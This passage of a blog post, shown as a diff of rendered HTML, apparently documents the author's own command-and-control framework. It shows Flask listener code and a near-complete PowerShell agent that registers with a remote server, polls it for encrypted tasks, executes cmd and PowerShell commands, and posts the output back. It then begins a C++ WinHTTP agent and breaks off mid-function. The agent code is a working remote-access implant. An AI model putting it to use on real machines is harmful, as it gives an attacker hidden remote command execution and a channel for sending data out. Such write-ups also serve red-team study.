+    <span class="k">return</span> <span class="p">(</span><span class="n">oneliner</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="starting-and-stopping">Starting and Stopping</h3>
+
+<p>I had to start listeners in threads, however <code class="language-plaintext highlighter-rouge">flask</code> applications don’t provide a reliable way to stop the application once started, the only way was to kill the process, but killing threads wasn’t also so easy, so what I did was creating a <code class="language-plaintext highlighter-rouge">Process</code> object for the function that starts the application, and a thread that starts that process which means that terminating the process would kill the thread and stop the application.<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+	
+<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="n">disabled</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">ipaddress</span><span class="p">)</span>
+
+<span class="p">...</span>
+    
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    
+    <span class="bp">self</span><span class="p">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">run</span><span class="p">)</span>
+
+    <span class="n">cli</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">[</span><span class="s">'flask.cli'</span><span class="p">]</span>
+    <span class="n">cli</span><span class="p">.</span><span class="n">show_server_banner</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">x</span><span class="p">:</span> <span class="bp">None</span>
+
+    <span class="bp">self</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">,</span>
+                                       <span class="n">target</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">start</span><span class="p">,</span>
+                                       <span class="n">args</span> <span class="o">=</span> <span class="p">())</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">daemon</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">daemon</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="bp">self</span><span class="p">.</span><span class="n">isRunning</span> <span class="o">=</span> <span class="bp">True</span>
+    
+<span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    
+    <span class="bp">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">terminate</span><span class="p">()</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">server</span>    <span class="o">=</span> <span class="bp">None</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">daemon</span>    <span class="o">=</span> <span class="bp">None</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">isRunning</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="p">...</span>
+</code></pre></div></div>
+
+<h2 id="agents">Agents</h2>
+
+<h3 id="basic-info-1">Basic Info</h3>
+
+<p>As mentioned earlier, I wrote two agents, one in <code class="language-plaintext highlighter-rouge">powershell</code> and the other in <code class="language-plaintext highlighter-rouge">c++</code>. Before going through the code of each one, let me talk about what agents do.<br></p>
+
+<p>When an agent is executed on a system, first thing it does is get the hostname of that system then send the registration request to the server (<code class="language-plaintext highlighter-rouge">/reg</code> as discussed earlier).<br></p>
+
+<p>After receiving the response which contains its name it starts an infinite loop in which it keeps checking if there are any new tasks, if there are new tasks it executes them and sends the results back to the server.<br></p>
+
+<p>After each loop it sleeps for a specified amount of time that’s controlled by the server, the default sleep time is 3 seconds.<br></p>
+
+<p>We can represent that in pseudo code like this:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get</span> <span class="n">hostname</span>
+<span class="n">send</span> <span class="p">[</span><span class="n">hostname</span><span class="p">,</span> <span class="n">type</span><span class="p">],</span> <span class="n">get</span> <span class="n">name</span>
+
+<span class="n">loop</span><span class="p">{</span>
+	
+	<span class="n">check</span> <span class="k">if</span> <span class="n">there</span> <span class="n">are</span> <span class="n">any</span> <span class="k">new</span> <span class="n">tasks</span>
+	
+	<span class="k">if</span> <span class="n">new_tasks</span><span class="p">{</span>
+    	
+            <span class="n">execute</span> <span class="n">tasks</span>
+    	    <span class="n">send</span> <span class="n">results</span>
+    
+    <span class="p">}</span>
+    
+    <span class="k">else</span><span class="p">{</span>
+    	<span class="k">do</span> <span class="n">nothing</span>
+    <span class="p">}</span>
+    
+    <span class="n">sleep</span> <span class="n">n</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So far, agents can only do two basic things, execute <code class="language-plaintext highlighter-rouge">cmd</code> and <code class="language-plaintext highlighter-rouge">powershell</code>.<br></p>
+
+<h3 id="powershell-agent">PowerShell Agent</h3>
+
+<p>I won’t talk about the crypto functions here, I will leave that for the encryption part.<br></p>
+
+<p>First 5 lines of the agent are just the basic variables which are the <code class="language-plaintext highlighter-rouge">IP</code> address, port, key, name and the time to sleep:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ip</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="s2">"REPLACE_IP"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"REPLACE_PORT"</span><span class="w">
+</span><span class="nv">$key</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">"REPLACE_KEY"</span><span class="w">
+</span><span class="nv">$n</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w">
+</span><span class="nv">$name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="w">
+</span></code></pre></div></div>
+
+<p>As mentioned earlier, It gets the hostname, sends the registration request and receives its name:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$hname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Net.Dns</span><span class="p">]::</span><span class="n">GetHostName</span><span class="p">()</span><span class="w">
+</span><span class="nv">$type</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">"p"</span><span class="w">
+</span><span class="nv">$regl</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s2">"http"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"//</span><span class="nv">$ip</span><span class="s2">"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"</span><span class="nv">$port</span><span class="s2">/reg"</span><span class="p">)</span><span class="w">
+</span><span class="nv">$data</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w">
+    </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$hname</span><span class="s2">"</span><span class="w"> 
+    </span><span class="nx">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$type</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="nv">$name</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$regl</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">)</span><span class="o">.</span><span class="nf">Content</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Based on the received name it creates the variables for the tasks <code class="language-plaintext highlighter-rouge">uri</code> and the results <code class="language-plaintext highlighter-rouge">uri</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$resultl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s2">"http"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"//</span><span class="nv">$ip</span><span class="s2">"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"</span><span class="nv">$port</span><span class="s2">/results/</span><span class="nv">$name</span><span class="s2">"</span><span class="p">)</span><span class="w">
+</span><span class="nv">$taskl</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s2">"http"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"//</span><span class="nv">$ip</span><span class="s2">"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"</span><span class="nv">$port</span><span class="s2">/tasks/</span><span class="nv">$name</span><span class="s2">"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Then it starts the infinite loop:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">for</span><span class="w"> </span><span class="p">(;;){</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span><span class="n">sleep</span><span class="w"> </span><span class="nv">$n</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Let’s take a look inside the loop, first thing it does is request new tasks, we know that if there are no new tasks the server will respond with a <code class="language-plaintext highlighter-rouge">204</code> empty response, so it checks if the response is not null or empty and based on that it decides whether to execute the task execution code block or just sleep again:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$task</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$taskl</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="s1">'GET'</span><span class="p">)</span><span class="o">.</span><span class="nf">Content</span><span class="w">
+    
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-Not</span><span class="w"> </span><span class="p">[</span><span class="n">string</span><span class="p">]::</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="nv">$task</span><span class="p">)){</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Inside the task execution code block it takes the encrypted response and decrypts it, splits it then saves the first word in a variable called flag:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Decrypt</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="nv">$task</span><span class="w">
+</span><span class="nv">$task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="o">.</span><span class="nf">split</span><span class="p">()</span><span class="w">
+</span><span class="nv">$flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>If the flag was <code class="language-plaintext highlighter-rouge">VALID</code> it will continue, otherwise it will sleep again. This ensures that the data has been decrypted correctly.<br></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$flag</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"VALID"</span><span class="p">){</span><span class="w">
+</span></code></pre></div></div>
+
+<p>After ensuring that the data is valid, it takes the command it’s supposed to execute and the arguments:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">
+</span><span class="bp">$args</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="p">[</span><span class="mi">2</span><span class="o">..</span><span class="nv">$task</span><span class="o">.</span><span class="nf">Length</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>There are 5 valid commands, <code class="language-plaintext highlighter-rouge">shell</code>, <code class="language-plaintext highlighter-rouge">powershell</code>, <code class="language-plaintext highlighter-rouge">rename</code>, <code class="language-plaintext highlighter-rouge">sleep</code> and <code class="language-plaintext highlighter-rouge">quit</code>.<br></p>
+
+<p><code class="language-plaintext highlighter-rouge">shell</code> executes <code class="language-plaintext highlighter-rouge">cmd</code> commands, <code class="language-plaintext highlighter-rouge">powershell</code> executes <code class="language-plaintext highlighter-rouge">powershell</code> commands, <code class="language-plaintext highlighter-rouge">rename</code> changes the agent’s name, <code class="language-plaintext highlighter-rouge">sleep</code> changes the sleep time and <code class="language-plaintext highlighter-rouge">quit</code> just exits.<br></p>
+
+<p>Let’s take a look at each one of them. The <code class="language-plaintext highlighter-rouge">shell</code> and <code class="language-plaintext highlighter-rouge">powershell</code> commands basically rely on the same function called <code class="language-plaintext highlighter-rouge">shell</code>, so let’s look at that first:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">shell</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span><span class="w"> </span><span class="nv">$arg</span><span class="p">){</span><span class="w">
+    
+    </span><span class="nv">$pinfo</span><span class="w">                        </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Diagnostics.ProcessStartInfo</span><span class="w">
+    </span><span class="nv">$pinfo</span><span class="o">.</span><span class="nf">FileName</span><span class="w">               </span><span class="o">=</span><span class="w"> </span><span class="nv">$fname</span><span class="w">
+    </span><span class="nv">$pinfo</span><span class="o">.</span><span class="nf">RedirectStandardError</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="w">
+    </span><span class="nv">$pinfo</span><span class="o">.</span><span class="nf">RedirectStandardOutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="w">
+    </span><span class="nv">$pinfo</span><span class="o">.</span><span class="nf">UseShellExecute</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="bp">$false</span><span class="w">
+    </span><span class="nv">$pinfo</span><span class="o">.</span><span class="nf">Arguments</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="nv">$arg</span><span class="w">
+    </span><span class="nv">$p</span><span class="w">                            </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Diagnostics.Process</span><span class="w">
+    </span><span class="nv">$p</span><span class="o">.</span><span class="nf">StartInfo</span><span class="w">                  </span><span class="o">=</span><span class="w"> </span><span class="nv">$pinfo</span><span class="w">
+    
+    </span><span class="nv">$p</span><span class="o">.</span><span class="nf">Start</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
+    </span><span class="nv">$p</span><span class="o">.</span><span class="nf">WaitForExit</span><span class="p">()</span><span class="w">
+    
+    </span><span class="nv">$stdout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$p</span><span class="o">.</span><span class="nf">StandardOutput</span><span class="o">.</span><span class="nf">ReadToEnd</span><span class="p">()</span><span class="w">
+    </span><span class="nv">$stderr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$p</span><span class="o">.</span><span class="nf">StandardError</span><span class="o">.</span><span class="nf">ReadToEnd</span><span class="p">()</span><span class="w">
+
+    </span><span class="nv">$res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"VALID </span><span class="nv">$stdout</span><span class="se">`n</span><span class="nv">$stderr</span><span class="s2">"</span><span class="w">
+    </span><span class="nv">$res</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>It starts a new process with the given file name whether it was <code class="language-plaintext highlighter-rouge">cmd.exe</code> or <code class="language-plaintext highlighter-rouge">powershell.exe</code> and passes the given arguments, then it receives <code class="language-plaintext highlighter-rouge">stdout</code> and <code class="language-plaintext highlighter-rouge">stderr</code> and returns the result which is the <code class="language-plaintext highlighter-rouge">VALID</code> flag appended with <code class="language-plaintext highlighter-rouge">stdout</code> and <code class="language-plaintext highlighter-rouge">stderr</code> separated by a newline.<br></p>
+
+<p>Now back to the <code class="language-plaintext highlighter-rouge">shell</code> and <code class="language-plaintext highlighter-rouge">powershell</code> commands, both of them call <code class="language-plaintext highlighter-rouge">shell()</code> with the corresponding file name, receive the output, encrypt it and send it:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$command</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">){</span><span class="w">
+    </span><span class="nv">$f</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="w">
+    </span><span class="nv">$arg</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">"/c "</span><span class="w">
+            
+    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$a</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="bp">$args</span><span class="p">){</span><span class="w"> </span><span class="nv">$arg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">$a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">" "</span><span class="w"> </span><span class="p">}</span><span class="w">
+
+    </span><span class="nv">$res</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="nv">$f</span><span class="w"> </span><span class="nv">$arg</span><span class="w">
+    </span><span class="nv">$res</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">Encrypt</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="nv">$res</span><span class="w">
+    </span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$res</span><span class="s2">"</span><span class="p">}</span><span class="w">
+                
+    </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$resultl</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="s1">'POST'</span><span class="w">
+
+    </span><span class="p">}</span><span class="w">
+    </span><span class="kr">elseif</span><span class="w"> </span><span class="p">(</span><span class="nv">$command</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"powershell"</span><span class="p">){</span><span class="w">
+    
+    </span><span class="nv">$f</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">"powershell.exe"</span><span class="w">
+    </span><span class="nv">$arg</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">"/c "</span><span class="w">
+            
+    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$a</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="bp">$args</span><span class="p">){</span><span class="w"> </span><span class="nv">$arg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">$a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">" "</span><span class="w"> </span><span class="p">}</span><span class="w">
+
+    </span><span class="nv">$res</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="nv">$f</span><span class="w"> </span><span class="nv">$arg</span><span class="w">
+    </span><span class="nv">$res</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">Encrypt</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="nv">$res</span><span class="w">
+    </span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$res</span><span class="s2">"</span><span class="p">}</span><span class="w">
+                
+    </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$resultl</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="s1">'POST'</span><span class="w">
+
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">sleep</code> command updates the <code class="language-plaintext highlighter-rouge">n</code> variable then sends an empty result indicating that it completed the task:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">elseif</span><span class="w"> </span><span class="p">(</span><span class="nv">$command</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"sleep"</span><span class="p">){</span><span class="w">
+    </span><span class="nv">$n</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">]</span><span class="bp">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">
+    </span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">}</span><span class="w">
+    </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$resultl</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="s1">'POST'</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">rename</code> command updates the <code class="language-plaintext highlighter-rouge">name</code> variable and updates the tasks and results <code class="language-plaintext highlighter-rouge">uri</code>s, then it sends an empty result indicating that it completed the task:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">elseif</span><span class="w"> </span><span class="p">(</span><span class="nv">$command</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"rename"</span><span class="p">){</span><span class="w">
+    </span><span class="nv">$name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="bp">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">
+    </span><span class="nv">$resultl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s2">"http"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"//</span><span class="nv">$ip</span><span class="s2">"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"</span><span class="nv">$port</span><span class="s2">/results/</span><span class="nv">$name</span><span class="s2">"</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$taskl</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s2">"http"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"//</span><span class="nv">$ip</span><span class="s2">"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"</span><span class="nv">$port</span><span class="s2">/tasks/</span><span class="nv">$name</span><span class="s2">"</span><span class="p">)</span><span class="w">
+    
+    </span><span class="nv">$data</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">}</span><span class="w">
+    </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$resultl</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="s1">'POST'</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">quit</code> command just exits:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">elseif</span><span class="w"> </span><span class="p">(</span><span class="nv">$command</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"quit"</span><span class="p">){</span><span class="w">
+	</span><span class="kr">exit</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="c-agent">C++ Agent</h3>
+
+<p>The same logic is applied in the c++ agent so I will skip the unnecessary parts and only talk about the <code class="language-plaintext highlighter-rouge">http</code> functions and the <code class="language-plaintext highlighter-rouge">shell</code> function.<br></p>
+
+<p>Sending <code class="language-plaintext highlighter-rouge">http</code> requests wasn’t as easy as it was in <code class="language-plaintext highlighter-rouge">powershell</code>, I used the <code class="language-plaintext highlighter-rouge">winhttp</code> library and with the help of the <a href="https://docs.microsoft.com/en-us/windows/win32/winhttp/about-winhttp" target="_blank" rel="noopener noreferrer">Microsoft documentation</a> I created two functions, one for sending <code class="language-plaintext highlighter-rouge">GET</code> requests and the other for sending <code class="language-plaintext highlighter-rouge">POST</code> requests. And they’re almost the same function so I guess I will rewrite them to be one function later.<br></p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="nf">Get</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">ip</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">uri</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">sip</span>     <span class="o">=</span> <span class="n">get_utf16</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">CP_UTF8</span><span class="p">);</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">suri</span>    <span class="o">=</span> <span class="n">get_utf16</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">CP_UTF8</span><span class="p">);</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">response</span><span class="p">;</span>
+
+    <span class="n">LPSTR</span> <span class="n">pszOutBuffer</span><span class="p">;</span>
+
+    <span class="n">DWORD</span> <span class="n">dwSize</span>       <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwDownloaded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">BOOL</span>  <span class="n">bResults</span>     <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+ 
+    <span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
+              <span class="n">hConnect</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
+              <span class="n">hRequest</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">hSession</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span><span class="s">L"test"</span><span class="p">,</span>
+                           <span class="n">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span class="p">,</span>
+                           <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span>
+                           <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span>
+                           <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="n">hConnect</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span>
+                                  <span class="n">sip</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span>
+                                  <span class="n">port</span><span class="p">,</span>
+                                  <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span> <span class="p">{</span>
+
